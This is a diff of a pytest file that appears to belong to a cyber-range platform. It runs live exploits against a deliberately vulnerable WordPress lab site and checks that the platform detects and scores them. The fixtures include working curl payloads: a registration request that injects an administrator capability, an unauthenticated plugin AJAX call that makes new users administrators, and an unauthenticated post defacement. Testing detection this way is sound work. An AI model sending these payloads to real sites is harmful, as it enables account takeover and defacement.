@@ -1,7 +1,8 @@
 import json
-import re
+import shlex
 import time
 import uuid
+from concurrent.futures import ThreadPoolExecutor
 from contextlib import contextmanager
 from datetime import datetime, timedelta, timezone
 
@@ -12,7 +13,7 @@ from conftest import (
     PLATFORM_URL, TARGET_PUBLIC, credited_to, from_attacker, run_redteam,
     runs_the_declared_rules, score_when_ready, seen_by_both_engines, target_code,
 )
-from range import ATTACKER, BOARD, missing, run, start_hint
+from range import ATTACKER, BOARD, missing, run, run_in_turn, run_side_by_side, start_hint
 
 CONTROL = "board-sqli-search"
 UNION = "board-sqli-union-search"
@@ -52,9 +53,10 @@ CORP = "corp"
 CORP_DB = "corp-db"
 CORP_HOST = "Host: corp.com"
 ROGUE_KEY = "wp_c%C3%A0pabilities%5Badministrator%5D=1"
-NONCE = re.compile(r'name="_wpnonce" value="([^"]+)"')
-AJAX_NONCE = re.compile(r'"ajaxSecurity":"([a-f0-9]+)"')
-SUBMISSION_NONCE = re.compile(r'rbGlobalSubmissionSettings = {"nonce":"([a-f0-9]+)"')
+NONCE_SLOT = "{nonce}"
+REGISTER_NONCE = r'name="_wpnonce" value="\K[^"]+'
+AJAX_NONCE = r'"ajaxSecurity":"\K[a-f0-9]+'
+SUBMISSION_NONCE = r'rbGlobalSubmissionSettings = {"nonce":"\K[a-f0-9]+'
 DEFACED = {
     "post_title": "Defaced by an unauthenticated guest",
     "post_excerpt": "overwritten without owning this post",
@@ -62,6 +64,7 @@ DEFACED = {
 }
 POST_FIELDS = ("post_title", "post_content", "post_excerpt", "post_status")
 WINDOW_GAP_SECONDS = 7
+SETTLE_SECONDS = 2
 
 
 def open_session(**settings) -> int:
@@ -466,32 +469,72 @@ def terminal_windows(stack_is_up):
     return seen
 
 
-def admin_ids(session=None):
-    out = run(CORP_DB, [
-        "mysql", "-uwordpress", "-pwordpress", "wordpress", "-N", "-e",
-        "SELECT user_id FROM wp_usermeta WHERE meta_key='wp_capabilities' "
-        "AND meta_value LIKE '%administrator%';",
-    ], session=session).stdout
+def wordpress_db(sql):
+    return ["mysql", "-uwordpress", "-pwordpress", "wordpress", "-N", "-e", sql]
+
+
+ADMINS = wordpress_db(
+    "SELECT user_id FROM wp_usermeta WHERE meta_key='wp_capabilities' "
+    "AND meta_value LIKE '%administrator%';"
+)
+FIRST_POST = wordpress_db(
+    f"SELECT ID,{','.join(POST_FIELDS)} FROM wp_posts WHERE post_type='post' ORDER BY ID ASC LIMIT 1;"
+)
+
+
+def option_query(name):
+    return wordpress_db(f"SELECT option_value FROM wp_options WHERE option_name='{name}';")
+
+
+def option_update(name, value):
+    return wordpress_db(f"UPDATE wp_options SET option_value='{value}' WHERE option_name='{name}';")
+
+
+def post_query(post_id):
+    return wordpress_db(f"SELECT {','.join(POST_FIELDS)} FROM wp_posts WHERE ID={post_id};")
+
+
+def ids_in(out):
     return {int(x) for x in out.split()}
 
 
-def register_nonce(session=None):
-    page = run(ATTACKER, [
-        "curl", "-s", "-H", CORP_HOST, "--max-time", "20",
-        f"{TARGET_PUBLIC}/register/",
-    ], session=session).stdout
-    found = NONCE.search(page)
-    assert found, "no _wpnonce on the live UM register form; is corp-wp up?"
-    return found.group(1)
+def first_post_in(out):
+    post_id, *fields = out.rstrip("\n").split("\t", len(POST_FIELDS))
+    return {"ID": post_id, **dict(zip(POST_FIELDS, fields))}
 
 
-def submit_registration(nonce, login, session=None):
-    return run(ATTACKER, [
+def post_in(out):
+    return dict(zip(POST_FIELDS, out.rstrip("\n").split("\t", len(POST_FIELDS) - 1)))
+
+
+def admin_ids(session=None):
+    return ids_in(run(CORP_DB, ADMINS, session=session).stdout)
+
+
+def post_row(post_id, session=None):
+    return post_in(run(CORP_DB, post_query(post_id), session=session).stdout)
+
+
+def with_nonce(page, pattern, *sent, session=None):
+    fetched = shlex.join(["curl", "-s", "-H", CORP_HOST, "--max-time", "20", f"{TARGET_PUBLIC}{page}"])
+    requests_sent = "; echo; ".join(
+        shlex.join(argv).replace(NONCE_SLOT, "'\"$nonce\"'") for argv in sent
+    )
+    script = (
+        f"nonce=$({fetched} | grep -oP {shlex.quote(pattern)} | head -n 1); "
+        f"printf '%s\\n' \"$nonce\"; [ -n \"$nonce\" ] || exit 0; {requests_sent}"
+    )
+    nonce, _, said = run(ATTACKER, ["sh", "-c", script], session=session).stdout.partition("\n")
+    return nonce.strip(), said.strip()
+
+
+def registration(login):
+    return [
         "curl", "-s", "-o", "/dev/null", "-w", "%{http_code}", "--max-time", "20",
         "-H", CORP_HOST,
         "--data", "form_id=5",
         "--data", "um_request=",
-        "--data", f"_wpnonce={nonce}",
+        "--data", f"_wpnonce={NONCE_SLOT}",
         "--data", "_wp_http_referer=/register/",
         "--data", f"user_login-5={login}",
         "--data", "first_name-5=North",
@@ -501,79 +544,24 @@ def submit_registration(nonce, login, session=None):
         "--data", "confirm_user_password-5=Str0ng-Pass-9271",
         "--data", ROGUE_KEY,
         f"{TARGET_PUBLIC}/register/",
-    ], session=session).stdout.strip()
+    ]
 
 
-def delete_user(uid, session=None):
-    run(CORP, ["wp", "--allow-root", "user", "delete", str(uid), "--yes", "--network"],
-        session=session)
-
-
-def option(name, session=None):
-    return run(CORP_DB, [
-        "mysql", "-uwordpress", "-pwordpress", "wordpress", "-N", "-e",
-        f"SELECT option_value FROM wp_options WHERE option_name='{name}';",
-    ], session=session).stdout.strip()
-
-
-def set_option(name, value, session=None):
-    run(CORP_DB, [
-        "mysql", "-uwordpress", "-pwordpress", "wordpress", "-e",
-        f"UPDATE wp_options SET option_value='{value}' WHERE option_name='{name}';",
-    ], session=session)
-
-
-def ajax_nonce(session=None):
-    page = run(ATTACKER, [
-        "curl", "-s", "-H", CORP_HOST, "--max-time", "20", f"{TARGET_PUBLIC}/",
-    ], session=session).stdout
-    found = AJAX_NONCE.search(page)
-    assert found, "no wpgdprcData.ajaxSecurity on the live corp.com homepage; is corp-wp up?"
-    return found.group(1)
-
-
-def flip(security, name, value, session=None):
-    return run(ATTACKER, [
+def option_flip(name, value):
+    return [
         "curl", "-s", "-o", "/dev/null", "-w", "%{http_code}", "--max-time", "20",
         "-H", CORP_HOST,
         "--data", f'data={{"type":"save_setting","append":false,"option":"{name}","value":"{value}"}}',
-        f"{TARGET_PUBLIC}/wp-admin/admin-ajax.php?action=wpgdprc_process_action&security={security}",
-    ], session=session).stdout.strip()
+        f"{TARGET_PUBLIC}/wp-admin/admin-ajax.php?action=wpgdprc_process_action&security={NONCE_SLOT}",
+    ]
 
 
-def first_post(session=None):
-    out = run(CORP_DB, [
-        "mysql", "-uwordpress", "-pwordpress", "wordpress", "-N", "-e",
-        f"SELECT ID,{','.join(POST_FIELDS)} FROM wp_posts WHERE post_type='post' ORDER BY ID ASC LIMIT 1;",
-    ], session=session).stdout
-    post_id, *fields = out.rstrip("\n").split("\t", len(POST_FIELDS))
-    return {"ID": post_id, **dict(zip(POST_FIELDS, fields))}
-
-
-def post_row(post_id, session=None):
-    out = run(CORP_DB, [
-        "mysql", "-uwordpress", "-pwordpress", "wordpress", "-N", "-e",
-        f"SELECT {','.join(POST_FIELDS)} FROM wp_posts WHERE ID={post_id};",
-    ], session=session).stdout
-    return dict(zip(POST_FIELDS, out.rstrip("\n").split("\t", len(POST_FIELDS) - 1)))
-
-
-def submission_nonce(session=None):
-    page = run(ATTACKER, [
-        "curl", "-s", "-H", CORP_HOST, "--max-time", "20",
-        f"{TARGET_PUBLIC}/submit-a-story/",
-    ], session=session).stdout
-    found = SUBMISSION_NONCE.search(page)
-    assert found, "no rbGlobalSubmissionSettings nonce on the live corp.com submission page; is corp-wp up?"
-    return found.group(1)
-
-
-def overwrite_post(nonce, post_id, session=None):
-    return run(ATTACKER, [
+def post_overwrite(post_id):
+    return [
         "curl", "-s", "--max-time", "20",
         "-H", CORP_HOST,
         "--data-urlencode", "action=rbsm_submit_post",
-        "--data-urlencode", f"_nonce={nonce}",
+        "--data-urlencode", f"_nonce={NONCE_SLOT}",
         "--data-urlencode", "formId=1",
         "--data-urlencode", f"postId={post_id}",
         "--data-urlencode", f"title={DEFACED['post_title']}",
@@ -582,24 +570,27 @@ def overwrite_post(nonce, post_id, session=None):
         "--data-urlencode", "userName=Anonymous Contributor",
         "--data-urlencode", "userEmail=anon@example.com",
         f"{TARGET_PUBLIC}/wp-admin/admin-ajax.php",
-    ], session=session).stdout.strip()
+    ]
 
 
-def restore_post(original, session=None):
-    run(CORP, [
-        "wp", "--allow-root", "post", "update", original["ID"],
-        f"--post_title={original['post_title']}",
-        f"--post_excerpt={original['post_excerpt']}",
-        f"--post_status={original['post_status']}",
-    ], session=session)
+def site_restored(created, original):
+    return {
+        **{f"user {uid}": ["wp", "--allow-root", "user", "delete", str(uid), "--yes", "--network"]
+           for uid in sorted(created)},
+        "post": [
+            "wp", "--allow-root", "post", "update", original["ID"],
+            f"--post_title={original['post_title']}",
+            f"--post_excerpt={original['post_excerpt']}",
+            f"--post_status={original['post_status']}",
+        ],
+        **{meta: ["wp", "--allow-root", "post", "meta", "delete", original["ID"], meta]
+           for meta in ("rbsm_form_id", "rbsm_author_info")},
+    }
+
+
+def content_restored(original):
     quoted = "'" + original["post_content"].replace("'", "\\'") + "'"
-    run(CORP_DB, [
-        "mysql", "-uwordpress", "-pwordpress", "wordpress", "-e",
-        f"UPDATE wp_posts SET post_content={quoted} WHERE ID={original['ID']}",
-    ], session=session)
-    for meta in ("rbsm_form_id", "rbsm_author_info"):
-        run(CORP, ["wp", "--allow-root", "post", "meta", "delete", original["ID"], meta],
-            session=session)
+    return wordpress_db(f"UPDATE wp_posts SET post_content={quoted} WHERE ID={original['ID']}")
 
 
 def corp_is_declared():
@@ -610,6 +601,15 @@ def corp_is_declared():
         f"in platform/range/declaration.yaml for it, so nothing builds or boots "
         f"the target and the live exploit has nothing to change"
     )
+
+
+def finished(*calls):
+    with ThreadPoolExecutor(max_workers=len(calls)) as pool:
+        return [pool.submit(call) for call in calls]
+
+
+def settled(since, seconds):
+    time.sleep(max(0.0, since + seconds - time.monotonic()))
 
 
 def record_corp_window(session_id, name, fired_at, done_at):
@@ -629,74 +629,118 @@ def record_corp_window(session_id, name, fired_at, done_at):
 
 
 def judged_corp(session_id):
+    observed = requests.post(f"{PLATFORM_URL}/api/sessions/{session_id}/objectives/", timeout=120).json()
+    credited, score = finished(
+        lambda: requests.get(f"{PLATFORM_URL}/api/sessions/{session_id}/objectives/", timeout=60).json(),
+        lambda: requests.get(f"{PLATFORM_URL}/api/sessions/{session_id}/score/", timeout=60).json(),
+    )
     return {
-        "observed": requests.post(
-            f"{PLATFORM_URL}/api/sessions/{session_id}/objectives/", timeout=120
-        ).json(),
-        "credited": {o["key"] for o in requests.get(
-            f"{PLATFORM_URL}/api/sessions/{session_id}/objectives/", timeout=60
-        ).json()},
-        "score": requests.get(
-            f"{PLATFORM_URL}/api/sessions/{session_id}/score/", timeout=60
-        ).json(),
+        "observed": observed,
+        "credited": {o["key"] for o in credited.result()},
+        "score": score.result(),
     }
 
 
-@pytest.fixture(scope="session")
-def rogue_admin_session(stack_is_up):
-    corp_is_declared()
+def rogue_admin_run():
     with shared_session(scenario="corp") as session_id:
-        baseline = admin_ids(session_id)
-        original = first_post(session_id)
+        opened = time.monotonic()
+        before = run_side_by_side(CORP_DB, {"admins": ADMINS, "post": FIRST_POST}, session=session_id)
+        baseline, original = ids_in(before["admins"].stdout), first_post_in(before["post"].stdout)
         seen = {"session_id": session_id, "baseline": baseline, "created": set(), "original": original}
         try:
-            time.sleep(2)
+            settled(opened, SETTLE_SECONDS)
             fired_at = datetime.now(timezone.utc)
-            seen["code"] = submit_registration(
-                register_nonce(session_id), f"rogue_{uuid.uuid4().hex[:8]}", session_id
+            nonce, seen["code"] = with_nonce(
+                "/register/", REGISTER_NONCE, registration(f"rogue_{uuid.uuid4().hex[:8]}"),
+                session=session_id,
             )
             done_at = datetime.now(timezone.utc)
-            seen["admins"] = admin_ids(session_id)
+            gap_from = time.monotonic()
+            assert nonce, "no _wpnonce on the live UM register form; is corp-wp up?"
+            admins, recorded = finished(
+                lambda: admin_ids(session_id),
+                lambda: record_corp_window(session_id, "corp-rogue-admin", fired_at, done_at),
+            )
+            seen["admins"] = admins.result()
             seen["created"] = seen["admins"] - baseline
-            record_corp_window(session_id, "corp-rogue-admin", fired_at, done_at)
-            time.sleep(WINDOW_GAP_SECONDS)
+            recorded.result()
+            settled(gap_from, WINDOW_GAP_SECONDS)
             fired_at = datetime.now(timezone.utc)
-            seen["overwrite"] = overwrite_post(submission_nonce(session_id), original["ID"], session_id)
-            seen["overwritten"] = post_row(original["ID"], session_id)
+            nonce, seen["overwrite"] = with_nonce(
+                "/submit-a-story/", SUBMISSION_NONCE, post_overwrite(original["ID"]), session=session_id,
+            )
             done_at = datetime.now(timezone.utc)
-            record_corp_window(session_id, "corp-content-write", fired_at, done_at)
+            assert nonce, "no rbGlobalSubmissionSettings nonce on the live corp.com submission page; is corp-wp up?"
+            overwritten, recorded = finished(
+                lambda: post_row(original["ID"], session_id),
+                lambda: record_corp_window(session_id, "corp-content-write", fired_at, done_at),
+            )
+            seen["overwritten"] = overwritten.result()
+            recorded.result()
             seen.update(judged_corp(session_id))
         finally:
-            for uid in sorted(seen["created"]):
-                delete_user(uid, session_id)
-            seen["admins_left"] = admin_ids(session_id)
-            restore_post(original, session_id)
-            seen["restored"] = post_row(original["ID"], session_id)
+            run_in_turn(CORP, site_restored(seen["created"], original), timeout=180, session=session_id)
+            after = run_in_turn(CORP_DB, {
+                "content": content_restored(original),
+                "admins": ADMINS,
+                "post": post_query(original["ID"]),
+            }, session=session_id)
+            seen["admins_left"] = ids_in(after["admins"].stdout)
+            seen["restored"] = post_in(after["post"].stdout)
+    return seen
+
+
+def option_flip_run():
+    with shared_session(scenario="corp") as session_id:
+        opened = time.monotonic()
+        seen = {"session_id": session_id}
+        try:
+            settled(opened, SETTLE_SECONDS)
+            fired_at = datetime.now(timezone.utc)
+            nonce, said = with_nonce(
+                "/", AJAX_NONCE,
+                option_flip("users_can_register", "1"), option_flip("default_role", "administrator"),
+                session=session_id,
+            )
+            done_at = datetime.now(timezone.utc)
+            assert nonce, "no wpgdprcData.ajaxSecurity on the live corp.com homepage; is corp-wp up?"
+            seen["flips"] = tuple(said.split())
+            options, recorded = finished(
+                lambda: run_side_by_side(CORP_DB, {
+                    name: option_query(name) for name in ("users_can_register", "default_role")
+                }, session=session_id),
+                lambda: record_corp_window(session_id, "corp-self-registration", fired_at, done_at),
+            )
+            read = options.result()
+            seen["registration_open"] = read["users_can_register"].stdout.strip()
+            seen["default_role"] = read["default_role"].stdout.strip()
+            recorded.result()
+            seen.update(judged_corp(session_id))
+        finally:
+            left = run_in_turn(CORP_DB, {
+                "closed": option_update("users_can_register", "0"),
+                "subscriber": option_update("default_role", "subscriber"),
+                "users_can_register": option_query("users_can_register"),
+                "default_role": option_query("default_role"),
+            }, session=session_id)
+            seen["options_left"] = (
+                left["users_can_register"].stdout.strip(), left["default_role"].stdout.strip()
+            )
     return seen
 
 
 @pytest.fixture(scope="session")
-def option_flip_session(stack_is_up):
+def corp_sessions(stack_is_up):
     corp_is_declared()
-    with shared_session(scenario="corp") as session_id:
-        seen = {"session_id": session_id}
-        try:
-            time.sleep(2)
-            fired_at = datetime.now(timezone.utc)
-            security = ajax_nonce(session_id)
-            seen["flips"] = (
-                flip(security, "users_can_register", "1", session_id),
-                flip(security, "default_role", "administrator", session_id),
-            )
-            seen["registration_open"] = option("users_can_register", session_id)
-            seen["default_role"] = option("default_role", session_id)
-            done_at = datetime.now(timezone.utc)
-            record_corp_window(session_id, "corp-self-registration", fired_at, done_at)
-            seen.update(judged_corp(session_id))
-        finally:
-            set_option("users_can_register", "0", session_id)
-            set_option("default_role", "subscriber", session_id)
-            seen["options_left"] = (
-                option("users_can_register", session_id), option("default_role", session_id)
-            )
-    return seen
+    rogue_admin, option_flip_seen = finished(rogue_admin_run, option_flip_run)
+    return {"rogue_admin": rogue_admin.result(), "option_flip": option_flip_seen.result()}
+
+
+@pytest.fixture(scope="session")
+def rogue_admin_session(corp_sessions):
+    return corp_sessions["rogue_admin"]
+
+
+@pytest.fixture(scope="session")
+def option_flip_session(corp_sessions):
+    return corp_sessions["option_flip"]
